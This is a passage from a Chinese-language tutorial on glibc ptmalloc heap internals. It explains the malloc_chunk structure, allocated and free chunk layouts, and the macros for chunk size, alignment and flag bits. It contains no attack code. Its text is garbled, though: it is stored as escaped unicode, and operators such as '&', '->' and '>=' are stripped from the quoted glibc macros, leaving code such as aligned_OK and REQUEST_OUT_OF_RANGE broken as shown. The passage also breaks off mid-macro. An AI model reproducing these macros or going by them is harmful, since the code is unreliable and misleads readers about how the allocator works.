\u7ed3\u6784\u4f53\u6765\u8868\u793a\u3002\u5f53\u7a0b\u5e8f\u7533\u8bf7\u7684 chunk \u88ab free \u540e\uff0c\u4f1a\u88ab\u52a0\u5165\u5230\u76f8\u5e94\u7684\u7a7a\u95f2\u7ba1\u7406\u5217\u8868\u4e2d\u3002\n\n\n\u975e\u5e38\u6709\u610f\u601d\u7684\u662f\uff0c\n\u65e0\u8bba\u4e00\u4e2a chunk \u7684\u5927\u5c0f\u5982\u4f55\uff0c\u5904\u4e8e\u5206\u914d\u72b6\u6001\u8fd8\u662f\u91ca\u653e\u72b6\u6001\uff0c\u5b83\u4eec\u90fd\u4f7f\u7528\u4e00\u4e2a\u7edf\u4e00\u7684\u7ed3\u6784\n\u3002\u867d\u7136\u5b83\u4eec\u4f7f\u7528\u4e86\u540c\u4e00\u4e2a\u6570\u636e\u7ed3\u6784\uff0c\u4f46\u662f\u6839\u636e\u662f\u5426\u88ab\u91ca\u653e\uff0c\u5b83\u4eec\u7684\u8868\u73b0\u5f62\u5f0f\u4f1a\u6709\u6240\u4e0d\u540c\u3002\n\n\nmalloc_chunk \u7684\u7ed3\u6784\u5982\u4e0b\n\n\n/*\n\n\n  This struct declaration is misleading (but accurate and necessary).\n\n\n  It declares a \nview\n into memory allowing access to necessary\n\n\n  fields at known offsets from a given base. See explanation below.\n\n\n*/\n\n\nstruct\n \nmalloc_chunk\n \n{\n\n\n  \nINTERNAL_SIZE_T\n      \nprev_size\n;\n  \n/* Size of previous chunk (if free).  */\n\n  \nINTERNAL_SIZE_T\n      \nsize\n;\n       \n/* Size in bytes, including overhead. */\n\n\n  \nstruct\n \nmalloc_chunk\n*\n \nfd\n;\n         \n/* double links -- used only if free. */\n\n  \nstruct\n \nmalloc_chunk\n*\n \nbk\n;\n\n\n  \n/* Only used for large blocks: pointer to next larger size.  */\n\n  \nstruct\n \nmalloc_chunk\n*\n \nfd_nextsize\n;\n \n/* double links -- used only if free. */\n\n  \nstruct\n \nmalloc_chunk\n*\n \nbk_nextsize\n;\n\n\n};\n\n\n\n\n\n\u9996\u5148\uff0c\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e9b\u5fc5\u8981\u7684\u89e3\u91ca INTERNAL_SIZE_T\uff0cSIZE_SZ\uff0cMALLOC_ALIGN_MASK\uff1a\n\n\n/* INTERNAL_SIZE_T is the word-size used for internal bookkeeping of\n\n\n   chunk sizes.\n\n\n   The default version is the same as size_t.\n\n\n   While not strictly necessary, it is best to define this as an\n\n\n   unsigned type, even if size_t is a signed type. This may avoid some\n\n\n   artificial size limitations on some systems.\n\n\n   On a 64-bit machine, you may be able to reduce malloc overhead by\n\n\n   defining INTERNAL_SIZE_T to be a 32 bit `unsigned int\n at the\n\n\n   expense of not being able to handle more than 2^32 of malloced\n\n\n   space. If this limitation is acceptable, you are encouraged to set\n\n\n   this unless you are on a platform requiring 16byte alignments. In\n\n\n   this case the alignment requirements turn out to negate any\n\n\n   potential advantages of decreasing size_t word size.\n\n\n   Implementors: Beware of the possible combinations of:\n\n\n     - INTERNAL_SIZE_T might be signed or unsigned, might be 32 or 64 bits,\n\n\n       and might be the same width as int or as long\n\n\n     - size_t might have different width and signedness as INTERNAL_SIZE_T\n\n\n     - int and long might be 32 or 64 bits, and might be the same width\n\n\n   To deal with this, most comparisons and difference computations\n\n\n   among INTERNAL_SIZE_Ts should cast them to unsigned long, being\n\n\n   aware of the fact that casting an unsigned int to a wider long does\n\n\n   not sign-extend. (This also makes checking for negative numbers\n\n\n   awkward.) Some of these casts result in harmless compiler warnings\n\n\n   on some systems.  */\n\n\n#ifndef INTERNAL_SIZE_T\n\n\n# define INTERNAL_SIZE_T size_t\n\n\n#endif\n\n\n\n/* The corresponding word size.  */\n\n\n#define SIZE_SZ (sizeof (INTERNAL_SIZE_T))\n\n\n\n/* The corresponding bit mask value.  */\n\n\n#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)\n\n\n\n\n\n\u4e00\u822c\u6765\u8bf4\uff0csize_t \u5728 64 \u4f4d\u4e2d\u662f 64 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\uff0c32 \u4f4d\u4e2d\u662f 32 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\u3002\n\n\n\u6bcf\u4e2a\u5b57\u6bb5\u7684\u5177\u4f53\u7684\u89e3\u91ca\u5982\u4e0b\n\n\n\n\nprev_size\n,  \u5982\u679c\u8be5 chunk \u7684\n\u7269\u7406\u76f8\u90bb\u7684\u524d\u4e00\u5730\u5740chunk\uff08\u4e24\u4e2a\u6307\u9488\u7684\u5730\u5740\u5dee\u503c\u4e3a\u524d\u4e00chunk\u5927\u5c0f\uff09\n\u662f\u7a7a\u95f2\u7684\u8bdd\uff0c\u90a3\u8be5\u5b57\u6bb5\u8bb0\u5f55\u7684\u662f\u524d\u4e00\u4e2a chunk \u7684\u5927\u5c0f(\u5305\u62ec chunk \u5934)\u3002\u5426\u5219\uff0c\u8be5\u5b57\u6bb5\u53ef\u4ee5\u7528\u6765\u5b58\u50a8\u7269\u7406\u76f8\u90bb\u7684\u524d\u4e00\u4e2achunk \u7684\u6570\u636e\u3002\n\u8fd9\u91cc\u7684\u524d\u4e00 chunk \u6307\u7684\u662f\u8f83\u4f4e\u5730\u5740\u7684 chunk \n\u3002\n\n\nsize\n \uff0c\u8be5 chunk \u7684\u5927\u5c0f\uff0c\u5927\u5c0f\u5fc5\u987b\u662f 2 * SIZE_SZ \u7684\u6574\u6570\u500d\u3002\u5982\u679c\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e0d\u662f 2 * SIZE_SZ \u7684\u6574\u6570\u500d\uff0c\u4f1a\u88ab\u8f6c\u6362\u6ee1\u8db3\u5927\u5c0f\u7684\u6700\u5c0f\u7684 2 * SIZE_SZ \u7684\u500d\u6570\u300232 \u4f4d\u7cfb\u7edf\u4e2d\uff0cSIZE_SZ \u662f 4\uff1b64 \u4f4d\u7cfb\u7edf\u4e2d\uff0cSIZE_SZ \u662f 8\u3002 \u8be5\u5b57\u6bb5\u7684\u4f4e\u4e09\u4e2a\u6bd4\u7279\u4f4d\u5bf9 chunk \u7684\u5927\u5c0f\u6ca1\u6709\u5f71\u54cd\uff0c\u5b83\u4eec\u4ece\u9ad8\u5230\u4f4e\u5206\u522b\u8868\u793a\n\n\nNON_MAIN_ARENA\uff0c\u8bb0\u5f55\u5f53\u524d chunk \u662f\u5426\u4e0d\u5c5e\u4e8e\u4e3b\u7ebf\u7a0b\uff0c1\u8868\u793a\u4e0d\u5c5e\u4e8e\uff0c0\u8868\u793a\u5c5e\u4e8e\u3002\n\n\nIS_MAPPED\uff0c\u8bb0\u5f55\u5f53\u524d chunk \u662f\u5426\u662f\u7531 mmap \u5206\u914d\u7684\u3002 \n\n\nPREV_INUSE\uff0c\u8bb0\u5f55\u524d\u4e00\u4e2a chunk \u5757\u662f\u5426\u88ab\u5206\u914d\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5806\u4e2d\u7b2c\u4e00\u4e2a\u88ab\u5206\u914d\u7684\u5185\u5b58\u5757\u7684 size \u5b57\u6bb5\u7684P\u4f4d\u90fd\u4f1a\u88ab\u8bbe\u7f6e\u4e3a1\uff0c\u4ee5\u4fbf\u4e8e\u9632\u6b62\u8bbf\u95ee\u524d\u9762\u7684\u975e\u6cd5\u5185\u5b58\u3002\u5f53\u4e00\u4e2a chunk \u7684 size \u7684 P \u4f4d\u4e3a 0 \u65f6\uff0c\u6211\u4eec\u80fd\u901a\u8fc7 prev_size \u5b57\u6bb5\u6765\u83b7\u53d6\u4e0a\u4e00\u4e2a chunk \u7684\u5927\u5c0f\u4ee5\u53ca\u5730\u5740\u3002\u8fd9\u4e5f\u65b9\u4fbf\u8fdb\u884c\u7a7a\u95f2chunk\u4e4b\u95f4\u7684\u5408\u5e76\u3002\n\n\n\n\n\n\nfd\uff0cbk\n\u3002 chunk \u5904\u4e8e\u5206\u914d\u72b6\u6001\u65f6\uff0c\u4ece fd \u5b57\u6bb5\u5f00\u59cb\u662f\u7528\u6237\u7684\u6570\u636e\u3002chunk \u7a7a\u95f2\u65f6\uff0c\u4f1a\u88ab\u6dfb\u52a0\u5230\u5bf9\u5e94\u7684\u7a7a\u95f2\u7ba1\u7406\u94fe\u8868\u4e2d\uff0c\u5176\u5b57\u6bb5\u7684\u542b\u4e49\u5982\u4e0b\n\n\nfd \u6307\u5411\u4e0b\u4e00\u4e2a\uff08\u975e\u7269\u7406\u76f8\u90bb\uff09\u7a7a\u95f2\u7684 chunk\n\n\nbk \u6307\u5411\u4e0a\u4e00\u4e2a\uff08\u975e\u7269\u7406\u76f8\u90bb\uff09\u7a7a\u95f2\u7684 chunk\n\n\n\u901a\u8fc7 fd \u548c bk \u53ef\u4ee5\u5c06\u7a7a\u95f2\u7684 chunk \u5757\u52a0\u5165\u5230\u7a7a\u95f2\u7684 chunk \u5757\u94fe\u8868\u8fdb\u884c\u7edf\u4e00\u7ba1\u7406\n\n\n\n\n\n\nfd_nextsize\uff0c bk_nextsize\n\uff0c\u4e5f\u662f\u53ea\u6709 chunk \u7a7a\u95f2\u7684\u65f6\u5019\u624d\u4f7f\u7528\uff0c\u4e0d\u8fc7\u5176\u7528\u4e8e\u8f83\u5927\u7684 chunk\uff08large chunk\uff09\u3002\n\n\nfd_nextsize \u6307\u5411\u524d\u4e00\u4e2a\u4e0e\u5f53\u524d chunk \u5927\u5c0f\u4e0d\u540c\u7684\u7b2c\u4e00\u4e2a\u7a7a\u95f2\u5757\uff0c\u4e0d\u5305\u542b bin \u7684\u5934\u6307\u9488\u3002\n\n\nbk_nextsize \u6307\u5411\u540e\u4e00\u4e2a\u4e0e\u5f53\u524d chunk \u5927\u5c0f\u4e0d\u540c\u7684\u7b2c\u4e00\u4e2a\u7a7a\u95f2\u5757\uff0c\u4e0d\u5305\u542b bin \u7684\u5934\u6307\u9488\u3002\n\n\n\u4e00\u822c\u7a7a\u95f2\u7684 large chunk \u5728 fd \u7684\u904d\u5386\u987a\u5e8f\u4e2d\uff0c\u6309\u7167\u7531\u5927\u5230\u5c0f\u7684\u987a\u5e8f\u6392\u5217\u3002\n\u8fd9\u6837\u505a\u53ef\u4ee5\u907f\u514d\u5728\u5bfb\u627e\u5408\u9002chunk \u65f6\u6328\u4e2a\u904d\u5386\u3002\n\n\n\n\n\n\n\n\n\u4e00\u4e2a\u5df2\u7ecf\u5206\u914d\u7684 chunk \u7684\u6837\u5b50\u5982\u4e0b\u3002\n\u6211\u4eec\u79f0\u524d\u4e24\u4e2a\u5b57\u6bb5\u79f0\u4e3a chunk header\uff0c\u540e\u9762\u7684\u90e8\u5206\u79f0\u4e3auser data\u3002\u6bcf\u6b21 malloc \u7533\u8bf7\u5f97\u5230\u7684\u5185\u5b58\u6307\u9488\uff0c\u5176\u5b9e\u6307\u5411user data\u7684\u8d77\u59cb\u5904\u3002\n \n\n\n\u5f53\u4e00\u4e2a chunk \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\u65f6\uff0c\u5b83\u7684\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u57df\u65e0\u6548\uff0c\u6240\u4ee5\u4e0b\u4e00\u4e2a chunk \u7684\u8be5\u90e8\u5206\u4e5f\u53ef\u4ee5\u88ab\u5f53\u524dchunk\u4f7f\u7528\u3002\n\u8fd9\u5c31\u662fchunk\u4e2d\u7684\u7a7a\u95f4\u590d\u7528\u3002\n\n\nchunk\n-\n \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        \n|\n             \nSize\n \nof\n \nprevious\n \nchunk\n,\n \nif\n \nunallocated\n \n(\nP\n \nclear\n)\n  \n|\n\n        \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        \n|\n             \nSize\n \nof\n \nchunk\n,\n \nin\n \nbytes\n                     \n|\nA\n|\nM\n|\nP\n|\n\n  \nmem\n-\n \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        \n|\n             \nUser\n \ndata\n \nstarts\n \nhere\n...\n                          \n.\n\n        \n.\n                                                               \n.\n\n        \n.\n             \n(\nmalloc_usable_size\n()\n \nbytes\n)\n                      \n.\n\n\nnext\n    \n.\n                                                               \n|\n\n\nchunk\n-\n \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        \n|\n             \n(\nsize\n \nof\n \nchunk\n,\n \nbut\n \nused\n \nfor\n \napplication\n \ndata\n)\n    \n|\n\n        \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        \n|\n             \nSize\n \nof\n \nnext\n \nchunk\n,\n \nin\n \nbytes\n                \n|\nA\n|\n0\n|\n1\n|\n\n        \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n\n\n\n\n\u88ab\u91ca\u653e\u7684 chunk \u88ab\u8bb0\u5f55\u5728\u94fe\u8868\u4e2d\uff08\u53ef\u80fd\u662f\u5faa\u73af\u53cc\u5411\u94fe\u8868\uff0c\u4e5f\u53ef\u80fd\u662f\u5355\u5411\u94fe\u8868\uff09\u3002\u5177\u4f53\u7ed3\u6784\u5982\u4e0b\n\n\nchunk\n-\n \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        \n|\n             \nSize\n \nof\n \nprevious\n \nchunk\n,\n \nif\n \nunallocated\n \n(\nP\n \nclear\n)\n  \n|\n\n        \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n\n`\nhead\n:\n \n|\n             \nSize\n \nof\n \nchunk\n,\n \nin\n \nbytes\n                     \n|\nA\n|\n0\n|\nP\n|\n\n  \nmem\n-\n \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        \n|\n             \nForward\n \npointer\n \nto\n \nnext\n \nchunk\n \nin\n \nlist\n             \n|\n\n        \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        \n|\n             \nBack\n \npointer\n \nto\n \nprevious\n \nchunk\n \nin\n \nlist\n            \n|\n\n        \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        \n|\n             \nUnused\n \nspace\n \n(\nmay\n \nbe\n \n0\n \nbytes\n \nlong\n)\n                \n.\n\n        \n.\n                                                               \n.\n\n \nnext\n   \n.\n                                                               \n|\n\n\nchunk\n-\n \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n\n`\nfoot\n:\n \n|\n             \nSize\n \nof\n \nchunk\n,\n \nin\n \nbytes\n                           \n|\n\n        \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n        \n|\n             \nSize\n \nof\n \nnext\n \nchunk\n,\n \nin\n \nbytes\n                \n|\nA\n|\n0\n|\n0\n|\n\n        \n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n\n\n\n\n\n\u53ef\u4ee5\u53d1\u73b0\uff0c\u5982\u679c\u4e00\u4e2a chunk \u5904\u4e8e free \u72b6\u6001\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u4e2a\u4f4d\u7f6e\u8bb0\u5f55\u5176\u76f8\u5e94\u7684\u5927\u5c0f\n\n\n\n\n\n\n\u672c\u8eab\u7684size\u5b57\u6bb5\u4f1a\u8bb0\u5f55\uff0c\n\n\n\n\n\n\n\u5b83\u540e\u9762\u7684 chunk \u4f1a\u8bb0\u5f55\u3002\n\n\n\n\n\n\n\u4e00\u822c\u60c5\u51b5\u4e0b\n\uff0c\u7269\u7406\u76f8\u90bb\u7684\u4e24\u4e2a\u7a7a\u95f2 chunk \u4f1a\u88ab\u5408\u5e76\u4e3a\u4e00\u4e2a chunk \u3002\u5806\u7ba1\u7406\u5668\u4f1a\u901a\u8fc7 prev_size \u5b57\u6bb5\u4ee5\u53ca size \u5b57\u6bb5\u5408\u5e76\u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684\u7a7a\u95f2 chunk \u5757\u3002\n\n\n\uff01\uff01\uff01\u4e00\u4e9b\u5173\u4e8e\u5806\u7684\u7ea6\u675f\uff0c\u540e\u9762\u8be6\u7ec6\u8003\u8651\uff01\uff01\uff01\n\n\n/*\n\n\n    The three exceptions to all this are:\n\n\n     1. The special chunk `top\n doesn\nt bother using the\n\n\n    trailing size field since there is no next contiguous chunk\n\n\n    that would have to index off it. After initialization, `top\n\n\n    is forced to always exist.  If it would become less than\n\n\n    MINSIZE bytes long, it is replenished.\n\n\n     2. Chunks allocated via mmap, which have the second-lowest-order\n\n\n    bit M (IS_MMAPPED) set in their size fields.  Because they are\n\n\n    allocated one-by-one, each must contain its own trailing size\n\n\n    field.  If the M bit is set, the other bits are ignored\n\n\n    (because mmapped chunks are neither in an arena, nor adjacent\n\n\n    to a freed chunk).  The M bit is also used for chunks which\n\n\n    originally came from a dumped heap via malloc_set_state in\n\n\n    hooks.c.\n\n\n     3. Chunks in fastbins are treated as allocated chunks from the\n\n\n    point of view of the chunk allocator.  They are consolidated\n\n\n    with their neighbors only in bulk, in malloc_consolidate.\n\n\n*/\n\n\n\n\n\nchunk\u76f8\u5173\u5b8f\n\n\n\u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecd chunk \u7684\u5927\u5c0f\u3001\u5bf9\u9f50\u68c0\u67e5\u4ee5\u53ca\u4e00\u4e9b\u8f6c\u6362\u7684\u5b8f\u3002\n\n\nchunk \u4e0e mem \u6307\u9488\u5934\u90e8\u7684\u8f6c\u6362\n\n\nmem\u6307\u5411\u7528\u6237\u5f97\u5230\u7684\u5185\u5b58\u7684\u8d77\u59cb\u4f4d\u7f6e\u3002\n\n\n/* conversion from malloc headers to user pointers, and back */\n\n\n#define chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ))\n\n\n#define mem2chunk(mem) ((mchunkptr)((char *) (mem) -2 * SIZE_SZ))\n\n\n\n\n\n\u6700\u5c0f\u7684 chunk \u5927\u5c0f\n\n\n/* The smallest possible chunk */\n\n\n#define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))\n\n\n\n\n\n\u8fd9\u91cc\uff0coffsetof \u51fd\u6570\u8ba1\u7b97\u51fa fd_nextsize \u5728 malloc_chunk \u4e2d\u7684\u504f\u79fb\uff0c\u8bf4\u660e\u6700\u5c0f\u7684 chunk \u81f3\u5c11\u8981\u5305\u542b bk \u6307\u9488\u3002\n\n\n\u6700\u5c0f\u7533\u8bf7\u7684\u5806\u5185\u5b58\u5927\u5c0f\n\n\n\u7528\u6237\u6700\u5c0f\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u5fc5\u987b\u662f 2 * SIZE_SZ \u7684\u6700\u5c0f\u6574\u6570\u500d\u3002\n\n\n\u6ce8\uff1a\u5c31\u76ee\u524d\u800c\u770b MIN_CHUNK_SIZE \u548c MINSIZE \u5927\u5c0f\u662f\u4e00\u81f4\u7684\uff0c\u4e2a\u4eba\u8ba4\u4e3a\u4e4b\u6240\u4ee5\u8981\u6dfb\u52a0\u4e24\u4e2a\u5b8f\u662f\u4e3a\u4e86\u65b9\u4fbf\u4ee5\u540e\u4fee\u6539 malloc_chunk \u65f6\u65b9\u4fbf\u4e00\u4e9b\u3002\n\n\n/* The smallest size we can malloc is an aligned minimal chunk */\n\n\n//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1\n\n\n#define MINSIZE                                                                \\\n\n\n    (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) \n                   \\\n\n\n                      ~MALLOC_ALIGN_MASK))\n\n\n\n\n\n\u68c0\u67e5\u5206\u914d\u7ed9\u7528\u6237\u7684\u5185\u5b58\u662f\u5426\u5bf9\u9f50\n\n\n2 * SIZE_SZ \u5927\u5c0f\u5bf9\u9f50\u3002\n\n\n/* Check if m has acceptable alignment */\n\n\n// MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1\n\n\n#define aligned_OK(m) (((unsigned long) (m) \n MALLOC_ALIGN_MASK) == 0)\n\n\n\n#define misaligned_chunk(p)                                                    \\\n\n\n    ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) \n       \\\n\n\n     MALLOC_ALIGN_MASK)\n\n\n\n\n\n\u8bf7\u6c42\u5b57\u8282\u6570\u5224\u65ad\n\n\n/*\n\n\n   Check if a request is so large that it would wrap around zero when\n\n\n   padded and aligned. To simplify some other code, the bound is made\n\n\n   low enough so that adding MINSIZE will also not wrap around zero.\n\n\n */\n\n\n\n#define REQUEST_OUT_OF_RANGE(req)                                              \\\n\n\n    ((unsigned long) (req) \n= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))\n\n\n\n\n\n\u5c06\u7528\u6237\u8bf7\u6c42\u5185\u5b58\u5927\u5c0f\u8f6c\u4e3a\u5b9e\u9645\u5206\u914d\u5185\u5b58\u5927\u5c0f\n\n\n/* pad request bytes into a usable size -- internal version */\n\n\n//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1\n\n\n#define request2size(req)                                                      \\\n\n\n    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK \n MINSIZE)                           \\\n\n\n         ? MINSIZE                                                             \\\n\n\n         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) \n ~MALLOC_ALIGN_MASK)\n\n\n\n/*  Same, except also perform argument check */\n\n\n\n#define checked_request2size(req, sz)                                          \\\n\n\n    if (REQUEST_OUT_OF_RANGE(req)) {                                           \\\n\n\n        __set_errno(ENOMEM);                                                   \\\n\n\n        return 0;                                                              \\\n\n\n    }                                                                          \\\n\n\n    (sz) = request2size(req);\n\n\n\n\n\n\u5f53\u4e00\u4e2a chunk \u5904\u4e8e\u5df2\u5206\u914d\u72b6\u6001\u65f6\uff0c\u5b83\u7684\u7269\u7406\u76f8\u90bb\u7684\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u5b57\u6bb5\u5fc5\u7136\u662f\u65e0\u6548\u7684\uff0c\u6545\u800c\u8fd9\u4e2a\u5b57\u6bb5\u5c31\u53ef\u4ee5\u88ab\u5f53\u524d\u8fd9\u4e2a chunk \u4f7f\u7528\u3002\u8fd9\u5c31\u662f ptmalloc \u4e2d chunk \u95f4\u7684\u590d\u7528\u3002\u5177\u4f53\u6d41\u7a0b\u5982\u4e0b\n\n\n\n\n\u9996\u5148\uff0c\u5229\u7528 REQUEST_OUT_OF_RANGE \u5224\u65ad\u662f\u5426\u53ef\u4ee5\u5206\u914d\u7528\u6237\u8bf7\u6c42\u7684\u5b57\u8282\u5927\u5c0f\u7684 chunk\u3002\n\n\n\u5176\u6b21\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u7528\u6237\u8bf7\u6c42\u7684\u5b57\u8282\u662f\u7528\u6765\u5b58\u50a8\u6570\u636e\u7684\uff0c\u5373 chunk header \u540e\u9762\u7684\u90e8\u5206\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u7531\u4e8echunk \u95f4\u590d\u7528\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u5b57\u6bb5\u3002\u56e0\u6b64\uff0c\u8fd9\u91cc\u53ea\u9700\u8981\u518d\u6dfb\u52a0 SIZE_SZ \u5927\u5c0f\u5373\u53ef\u4ee5\u5b8c\u5168\u5b58\u50a8\u5185\u5bb9\u3002\n\n\n\u7531\u4e8e\u7cfb\u7edf\u4e2d\u6240\u5141\u8bb8\u7684\u7533\u8bf7\u7684 chunk \u6700\u5c0f\u662f MINSIZE\uff0c\u6240\u4ee5\u4e0e\u5176\u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c\u4e0d\u6ee1\u8db3\u6700\u4f4e\u8981\u6c42\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u76f4\u63a5\u5206\u914dMINSIZE\u5b57\u8282\u3002\n\n\n\u5982\u679c\u5927\u4e8e\u7684\u8bdd\uff0c\u56e0\u4e3a\u7cfb\u7edf\u4e2d\u7533\u8bf7\u7684 chunk \u9700\u8981 2 * SIZE_SZ \u5bf9\u9f50\uff0c\u6240\u4ee5\u8fd9\u91cc\u9700\u8981\u52a0\u4e0aMALLOC_ALIGN_MASK \u4ee5\u4fbf\u4e8e\u5bf9\u9f50\u3002\n\n\n\n\n\u4e2a\u4eba\u8ba4\u4e3a\uff0c\u8fd9\u91cc\u5728 request2size \u7684\u5b8f\u7684\u7b2c\u4e00\u884c\u4e2d\u6ca1\u6709\u5fc5\u8981\u52a0\u4e0a MALLOC_ALIGN_MASK\u3002\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u901a\u8fc7\u8fd9\u6837\u7684\u8ba1\u7b97\u516c\u5f0f\u5f97\u5230\u7684 size \u6700\u7ec8\u4e00\u5b9a\u662f\u6ee1\u8db3\u7528\u6237\u9700\u8981\u7684\u3002\n\n\n\u6807\u8bb0\u4f4d\u76f8\u5173\n\n\n/* size field is or\ned with PREV_INUSE when previous adjacent chunk in use */\n\n\n#define PREV_INUSE 0x1\n\n\n\n/* extract inuse bit of previous chunk */\n\n\n#define prev_inuse(p) ((p)-\nmchunk_size \n PREV_INUSE)\n\n\n\n/* size field is or\ned with IS_MMAPPED if the chunk was obtained with mmap() */\n\n\n#define IS_MMAPPED 0x2\n\n\n\n/* check for mmap()\ned chunk */\n\n\n#define chunk_is_mmapped(p) ((p)-\nmchunk_size \n IS_MMAPPED)\n\n\n\n/* size field is or\ned with NON_MAIN_ARENA if the chunk was obtained\n\n\n   from a non-main arena.  This is only set immediately before handing\n\n\n   the chunk to the user, if necessary.  */\n\n\n#define NON_MAIN_ARENA 0x4\n\n\n\n/* Check for chunk from main arena.  */\n\n\n#define chunk_main_arena(p) (((p)-\nmchunk_size \n NON_MAIN_ARENA) == 0)\n\n\n\n/* Mark a chunk as not being on the main arena.  */\n\n\n#define set_non_main_arena(p) ((p)-\nmchunk_size |= NON_MAIN_ARENA)\n\n\n\n/*\n\n\n   Bits to mask off when extracting size\n\n\n   Note: IS_MMAPPED is intentionally not masked off from size field in\n\n\n   macros for which mmapped chunks should never be seen. This should\n\n\n   cause helpful core dumps to occur if it is tried by accident by\n\n\n   people extending or adapting this malloc.\n\n\n */\n\n\n#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)\n\n\n\n\n\n\u83b7\u53d6chunk size\n\n\n/* Get size, ignoring use bits */\n\n\n#define chunksize(p) (chunksize_nomask(p) \n ~(SIZE_BITS))\n\n\n\n/* Like chunksize, but do not mask SIZE_BITS.  */\n\n\n#define chunksize_nomask(p) ((p)-\nmchunk_size)\n\n\n\n\n\n\u83b7\u53d6\u4e0b\u4e00\u4e2a\u7269\u7406\u76f8\u90bb\u7684chunk\n\n\n/* Ptr to next physical malloc_chunk. */\n\n\n#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))\n\n\n\n\n\n\u83b7\u53d6\u524d\u4e00\u4e2achunk\u7684\u4fe1\u606f\n\n\n/* Size of the chunk below P.  Only valid if prev_inuse (P).  */\n\n\n#define prev_size(p) ((p)-\nmchunk_prev_size)\n\n\n\n/* Set the size of the chunk below P.  Only valid if prev_inuse (P).  */\n\n\n#define set_prev_size(p, sz) ((p)-\nmchunk_prev_size = (sz))\n\n\n\n/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */\n\n\n#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))\n\n\n\n\n\n\u5f53\u524dchunk\u4f7f\u7528\u72b6\u6001\u76f8\u5173\u64cd\u4f5c\n\n\n/* extract p\ns inuse bit */\n\n\n#define inuse(p)                                                               \\\n\n\n    ((((mchunkptr)(((char *) (p)) + chunksize(p)))-\nmchunk_size) \n PREV_INUSE)\n\n\n\n/* set/clear chunk as being inuse without otherwise disturbing */\n\n\n#define set_inuse(p)                                                           \\\n\n\n    ((mchunkptr)(((char *) (p)) + chunksize(p)))-\nmchunk_size |= PREV_INUSE\n\n\n\n#define clear_inuse(p)                                                         \\\n\n\n    ((mchunkptr)(((char *) (p)) + chunksize(p)))-\nmchunk_size \n= ~(PREV_INUSE)\n\n\n\n\n\n\u8bbe\u7f6echunk\u7684size\u5b57\u6bb5\n\n\n/* Set size at head, without disturbing its use bit */\n\n\n// SIZE_BITS = 7\n\n\n#define set_head_size(p, s)                                                    \\\n\n\n    ((p)-\nmchunk_size = (((p)-\nmchunk_size \n SIZE_BITS) | (s)))\n\n\n\n/* Set size/use field */\n\n\n#define set_head(p, s) ((p)-\nmchunk_size = (s))\n\n\n\n/* Set size at footer (only when chunk is not in use) */\n\n\n#define set_foot(p, s)                                                         \\\n\n\n    (((mchunkptr)((char *) (p) + (s)))-\nmchunk_prev_size = 